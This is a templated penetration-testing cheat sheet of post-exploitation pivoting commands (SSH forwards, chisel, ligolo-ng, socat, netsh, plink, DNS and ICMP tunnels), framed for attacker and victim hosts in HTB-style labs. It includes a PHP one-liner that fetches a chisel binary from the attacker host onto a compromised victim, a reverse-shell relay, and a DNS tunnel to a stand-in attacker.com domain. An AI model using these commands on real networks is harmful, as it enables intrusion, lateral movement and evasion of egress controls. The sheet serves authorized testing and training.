# Port Forwarding & Pivoting

> SSH, chisel, ligolo-ng, sshuttle, socat — drawn from real HTB pivoting chains

<!-- tags: pivot, tunnel, network, ssh, chisel, ligolo, post -->

---

## Pivot - SSH Local Forward (-L)
Forward attacker:local_port -> remote target through SSH.

```bash
ssh -L {{LOCAL_PORT:port:8080}}:127.0.0.1:{{REMOTE_PORT:port:8080}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,local -->

---

## Pivot - SSH Local Forward to Internal Host
Reach a host behind the SSH server.

```bash
ssh -L {{LOCAL_PORT:port:5432}}:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:5432}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,internal -->

---

## Pivot - SSH Remote Forward (-R)
Open a listener on victim that forwards to attacker.

```bash
ssh -R {{REMOTE_PORT:port:8080}}:127.0.0.1:{{ATTACKER_PORT:port:8080}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=med | phase=post | tags=pivot,ssh,remote -->

---

## Pivot - SSH Dynamic SOCKS Proxy (-D)
SOCKS5 proxy through SSH.

```bash
ssh -D {{SOCKS_PORT:port:1080}} -N {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,socks -->

---

## Pivot - SSH Multi-Hop ProxyJump
Chain SSH hops in one command.

```bash
ssh -J {{HOP1:str:user@10.10.10.1}} {{USERNAME:str:user}}@{{INTERNAL_HOST:ip:10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,jump -->

---

## Pivot - sshuttle (VPN over SSH)
Route subnet through SSH like a VPN.

```bash
sshuttle -r {{USERNAME:str:user}}@{{TARGET:ip}} {{INTERNAL_NET:str:10.10.20.0/24}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,sshuttle,vpn -->

---

## Pivot - chisel Server (Attacker)
Listen for chisel client.

```bash
./chisel server -p {{PORT:port:8001}} --reverse
```

<!-- meta: risk=safe | phase=post | tags=pivot,chisel,server -->

---

## Pivot - chisel Client Reverse SOCKS (Victim)
Open SOCKS5 reverse proxy on attacker.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{SOCKS_PORT:port:1080}}:socks
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,socks -->

---

## Pivot - chisel Client Reverse Port Forward
Expose victim's localhost:3306 to attacker:3307.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{ATTACKER_PORT:port:3307}}:localhost:{{VICTIM_PORT:port:3306}}
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,reverse -->

---

## Pivot - chisel Client to Internal Host
Forward attacker:5000 to internal_host:5000 via victim.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{ATTACKER_PORT:port:5000}}:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:5000}}
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,internal -->

---

## Pivot - Drop chisel via PHP one-liner
Useful when only RCE/limited shell.

```bash
php -r 'file_put_contents("chisel", file_get_contents("http://{{LHOST:ip}}:{{LPORT:port:8000}}/chisel")); chmod("chisel",0755);'
```

<!-- meta: risk=safe | phase=post | tags=pivot,chisel,drop -->

---

## Pivot - ligolo-ng Setup (Attacker, One-Time)
Create the ligolo TUN interface.

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,setup -->

---

## Pivot - ligolo-ng Proxy (Attacker)
Run the proxy with self-signed cert.

```bash
./ligolo-proxy -selfcert
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,proxy -->

---

## Pivot - ligolo-ng Agent (Victim)
Connect agent back to attacker.

```bash
./agent -ignore-cert -connect {{LHOST:ip}}:{{PORT:port:11601}}
```

<!-- meta: risk=med | phase=post | tags=pivot,ligolo,agent -->

---

## Pivot - ligolo-ng Add Route
Route subnet through tunnel (run inside ligolo proxy session).

```bash
sudo ip route add {{INTERNAL_NET:str:10.10.20.0/24}} dev ligolo
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,route -->

---

## Pivot - ligolo-ng Listener (Reverse)
Expose attacker port via agent (e.g. for relay back).

```bash
echo "ligolo-ng » listener_add --addr 0.0.0.0:{{LISTEN_PORT:port:8888}} --to 127.0.0.1:{{LOCAL_PORT:port:8888}}"
```

<!-- meta: risk=med | phase=post | tags=pivot,ligolo,listener -->

---

## Pivot - proxychains Setup
Configure proxychains to route through SOCKS.

```bash
echo "socks5 127.0.0.1 {{SOCKS_PORT:port:1080}}" | sudo tee -a /etc/proxychains4.conf
proxychains4 -q nmap -sT -Pn {{INTERNAL_HOST:ip:10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,proxychains -->

---

## Pivot - proxychains nxc/curl
Run common tools through SOCKS.

```bash
proxychains4 -q nxc smb {{INTERNAL_HOST:ip:10.10.20.5}} -u {{USERNAME:str:user}} -p {{PASSWORD:str:pass}}
proxychains4 -q curl -s {{URL:url:http://10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,proxychains,tools -->

---

## Pivot - socat TCP Forward
Quick TCP relay.

```bash
socat TCP-LISTEN:{{LOCAL_PORT:port:8080}},fork,reuseaddr TCP:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:80}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,socat -->

---

## Pivot - socat Reverse Shell Relay
Relay reverse shell through pivot host.

```bash
socat TCP-LISTEN:{{LOCAL_PORT:port:9001}},fork,reuseaddr TCP:{{LHOST:ip}}:{{LPORT:port:9001}}
```

<!-- meta: risk=med | phase=post | tags=pivot,socat,revshell -->

---

## Pivot - netsh portproxy (Windows)
Built-in Windows port forward.

```bash
netsh interface portproxy add v4tov4 listenport={{LOCAL_PORT:port:8080}} connectaddress={{INTERNAL_HOST:ip:10.10.20.5}} connectport={{INTERNAL_PORT:port:80}}
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport={{LOCAL_PORT:port:8080}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,windows,netsh -->

---

## Pivot - plink Reverse Shell (Windows)
Pure plink.exe reverse SSH for legacy Windows.

```bash
plink.exe -ssh -l {{USERNAME:str:user}} -pw {{PASSWORD:str:pass}} -R {{REMOTE_PORT:port:8080}}:127.0.0.1:{{LOCAL_PORT:port:8080}} {{LHOST:ip}}
```

<!-- meta: risk=med | phase=post | tags=pivot,windows,plink -->

---

## Pivot - DNS Tunnel (iodine)
Last-resort tunnel via DNS.

```bash
sudo iodined -f -c -P {{PASSWORD:str:secret}} 10.0.0.1/24 {{TUNNEL_DOMAIN:domain:t1.attacker.com}}
sudo iodine -P {{PASSWORD:str:secret}} {{TUNNEL_DOMAIN:domain:t1.attacker.com}}
```

<!-- meta: risk=high | phase=post | tags=pivot,dns,iodine -->

---

## Pivot - ICMP Tunnel (ptunnel)
ICMP tunnel for restrictive egress.

```bash
sudo ptunnel-ng -p {{LHOST:ip}}
```

<!-- meta: risk=high | phase=post | tags=pivot,icmp,ptunnel -->

---

## Pivot - Inspect Routing on Compromised Host
Check what subnets the host can reach.

```bash
ip route
ip a
arp -a
cat /etc/resolv.conf
```

<!-- meta: risk=safe | phase=post | tags=pivot,recon -->

---

## Pivot - Find Internal Listening Ports
What's listening locally that we can forward.

```bash
ss -tlnp 2>/dev/null || netstat -tlnp
```

<!-- meta: risk=safe | phase=post | tags=pivot,enum -->

---

## Pivot - Add Route via Ligolo (240.0.0.1 trick)
Route 240.0.0.1/32 to access "DC itself" via tunnel.

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
echo "Now access dc01 services via 240.0.0.1:5985 etc"
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,trick -->
